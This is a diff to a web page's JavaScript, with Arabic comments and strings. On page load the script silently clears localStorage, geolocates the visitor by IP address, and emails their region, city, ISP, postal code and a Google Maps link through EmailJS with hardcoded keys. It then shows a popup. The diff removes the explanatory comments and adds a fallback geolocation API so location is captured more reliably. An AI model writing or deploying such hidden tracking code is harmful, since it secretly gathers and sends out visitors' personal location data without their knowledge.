@@ -1,33 +1,44 @@
 window.onload = function () {
-    // 1. حذف كل بيانات localStorage
     localStorage.clear();
 
-    // 2. تعريف العنصر الخاص بالنافذة المنبثقة
     const popup = document.getElementById("popup");
-
-    // 3. تهيئة EmailJS
     emailjs.init("GRpOF1pKqcSg9cx5H");
 
-    // 4. جلب عنوان IP والموقع
     fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
         .then(data => fetch(`https://ipapi.co/${data.ip}/json/`))
         .then(res => res.json())
         .then(loc => {
-            const lat = loc.latitude;
-            const lon = loc.longitude;
+            let googleMapUrl = "تعذر توليد رابط الخريطة";
 
-            const googleMapUrl = (lat && lon)
-                ? `https://www.google.com/maps?q=${lat},${lon}`
-                : "تعذر توليد رابط الخريطة";
+            if (loc.latitude && loc.longitude) {
+                googleMapUrl = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
+            } else {
+                // إذا لم تتوفر الإحداثيات، حاول الحصول على الموقع من API بديل (مثلاً freegeoip.app)
+                return fetch("https://freegeoip.app/json/")
+                    .then(res => res.json())
+                    .then(altLoc => {
+                        if (altLoc.latitude && altLoc.longitude) {
+                            googleMapUrl = `https://www.google.com/maps?q=${altLoc.latitude},${altLoc.longitude}`;
+                        }
+                        return {
+                            ...loc,
+                            latitude: altLoc.latitude || loc.latitude,
+                            longitude: altLoc.longitude || loc.longitude,
+                        };
+                    });
+            }
 
+            return loc;
+        })
+        .then(loc => {
             const locationString = `
                 ${loc.region || 'غير معروف'} - 
                 ${loc.city || 'غير معروف'} - 
                 ${loc.county || 'غير معروف'} - 
                 ${loc.org || 'غير معروف'} - 
                 ${loc.postal || 'بدون رمز بريدي'}
-                \nرابط الخريطة: ${googleMapUrl}
+                \nرابط الخريطة: ${loc.latitude && loc.longitude ? `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}` : "غير متوفر"}
             `;
 
             return emailjs.send("service_25q0ern", "template_xi6fmgy", {
@@ -41,7 +52,6 @@ window.onload = function () {
             console.error("خطأ أثناء جلب أو إرسال البيانات:", err);
         })
         .finally(() => {
-            // 5. عرض النافذة المنبثقة (مهما كان النجاح أو الفشل)
             if (popup) {
                 popup.style.display = "flex";
             }
